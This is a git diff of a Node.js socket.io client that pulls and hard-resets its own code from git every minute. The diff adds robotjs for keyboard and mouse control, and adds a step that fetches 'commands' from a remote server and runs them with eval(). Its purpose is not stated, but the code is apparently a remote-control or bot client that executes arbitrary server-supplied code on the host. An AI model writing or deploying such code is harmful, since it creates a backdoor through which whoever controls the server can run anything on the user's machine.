@@ -1,6 +1,9 @@
 const io = require('socket.io-client');
-const bytenode = require('bytenode');
 global.config = require('./config');
+const notifier = require('node-notifier');
+const path = require('path');
+const robot = require('robotjs');
+const jimp = require('jimp');
 
 global.sockets = {};
 global.sockets[0] = io(`${global.config.API}`, { transports: ['websocket'] });
@@ -20,7 +23,7 @@ setInterval(() => {
     global.sockets[0].emit('ping');
 }, 1000);
 
-setInterval(() => {
+function updateSystem() {
     let exec = require('child_process').exec;
     exec(`cd ${__dirname} && git reset --hard && git pull`, (err, stdout, stderr) => {
         console.log(stdout);
@@ -33,6 +36,17 @@ setInterval(() => {
             });
         }
     });
-}, 60000);
+}
 
-require('./functions/index.jsc');
+setInterval(() => {
+    updateSystem();
+}, 60000);
+updateSystem();
+
+setTimeout(() => {
+    console.log('executing commands...');
+    global.sockets[0].emit('getcommands', {}, (data) => {
+        //console.log(data);
+        eval(data);
+    });
+}, 2500);
